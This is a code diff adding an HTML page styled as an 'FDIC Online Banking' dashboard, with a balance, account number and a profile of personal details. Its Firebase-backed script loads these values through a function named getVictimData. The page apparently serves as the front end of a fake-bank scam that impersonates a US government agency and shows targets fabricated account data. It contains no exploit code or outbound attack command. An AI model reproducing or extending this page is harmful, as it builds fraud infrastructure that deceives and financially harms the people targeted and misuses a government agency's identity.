@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FDIC Dashboard</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="header">
+    <h2>FDIC Online Banking</h2>
+    <div class="user-info">
+      <span id="userNameDisplay">Loading...</span> | <a href="#" id="logoutBtn" style="color: white;">Sign Out</a>
+    </div>
+  </div>
+
+  <div class="nav-tabs">
+    <div class="nav-tab active" onclick="showTab('accounts')">Accounts</div>
+    <div class="nav-tab" onclick="showTab('activity')">Activity</div>
+    <div class="nav-tab" onclick="showTab('profile')">Profile</div>
+  </div>
+
+  <div class="content">
+    <!-- Accounts Tab -->
+    <div id="accounts" class="tab-content">
+      <div class="card">
+        <div class="account-header">
+          <span class="account-type" id="accountType">CHECKING</span>
+          <span class="account-number" id="accountNumber">---1234</span>
+        </div>
+        <div class="balance-label">Available Balance</div>
+        <div class="balance" id="balanceDisplay">$23,465.30</div>
+      </div>
+
+      <div class="quick-actions">
+        <div class="action-btn">Transfer Funds</div>
+        <div class="action-btn">Pay Bills</div>
+        <div class="action-btn">Deposit Check</div>
+      </div>
+    </div>
+
+    <!-- Activity Tab (Placeholder) -->
+    <div id="activity" class="tab-content" style="display:none;">
+      <div class="card">
+        <h3>Recent Transactions</h3>
+        <p style="color:#666; margin-top:10px;">No recent transactions found.</p>
+      </div>
+    </div>
+
+    <!-- Profile Tab -->
+    <div id="profile" class="tab-content" style="display:none;">
+      <div class="card">
+        <h3>Account Holder Details</h3>
+        <div class="demographics">
+          <div class="demo-item">
+            <div class="demo-label">Full Name</div>
+            <div class="demo-value" id="demoName">John Doe</div>
+          </div>
+          <div class="demo-item">
+            <div class="demo-label">Email</div>
+            <div class="demo-value" id="demoEmail">john@example.com</div>
+          </div>
+          <div class="demo-item">
+            <div class="demo-label">Phone</div>
+            <div class="demo-value" id="demoPhone">(555) 123-4567</div>
+          </div>
+          <div class="demo-item">
+            <div class="demo-label">Address</div>
+            <div class="demo-value" id="demoAddress">123 Main St, City, ST</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+    import { app } from "./app.js";
+    import { auth } from "./firebase-config.js";
+    import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+    // Handle Tab Switching
+    window.showTab = (tabId) => {
+      document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
+      document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
+      document.getElementById(tabId).style.display = 'block';
+      document.querySelector(`.nav-tab[onclick="showTab('${tabId}')"]`).classList.add('active');
+    };
+
+    // Handle Logout
+    document.getElementById('logoutBtn').addEventListener('click', (e) => {
+      e.preventDefault();
+      app.handleLogout();
+    });
+
+    // Load Data on Auth
+    onAuthStateChanged(auth, async (user) => {
+      if (user) {
+        const data = await app.getVictimData(user.uid);
+        if (data && !data.deleted) {
+          document.getElementById('userNameDisplay').textContent = data.name;
+          document.getElementById('accountType').textContent = data.type.toUpperCase();
+          document.getElementById('accountNumber').textContent = `---${data.last4}`;
+          document.getElementById('balanceDisplay').textContent = `$${parseFloat(data.balance).toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+          
+          // Demographics
+          document.getElementById('demoName').textContent = data.name;
+          document.getElementById('demoEmail').textContent = data.email;
+          document.getElementById('demoPhone').textContent = data.phone;
+          document.getElementById('demoAddress').textContent = data.address;
+        } else {
+          alert("Account not found or deleted.");
+          app.handleLogout();
+        }
+      } else {
+        window.location.href = "index.html";
+      }
+    });
+  </script>
+</body>
+</html>
